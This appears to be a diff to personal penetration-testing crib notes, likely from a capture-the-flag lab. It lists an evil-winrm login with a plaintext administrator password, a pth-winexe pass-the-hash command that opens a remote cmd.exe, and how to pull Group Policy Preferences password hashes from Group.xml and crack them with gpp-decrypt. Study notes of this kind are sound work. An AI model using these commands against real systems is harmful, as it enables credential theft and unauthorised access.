@@ -11,3 +11,16 @@ evil-winrm -u administrator -p !R3m0te! -i 10.129.77.180
 Command to login with hash:
 
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 //10.129.95.188 cmd.exe
+
+***************************************************************************************************************************
+
+Active Directory Notes:
+
+Following type of location can provide one of the file in which we can get the password hash of a user:
+
+cd Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Group.xml
+
+Sometime that hash can be cracked with ffollowing command:
+
+gpp-decrypt <hash-value> 
+
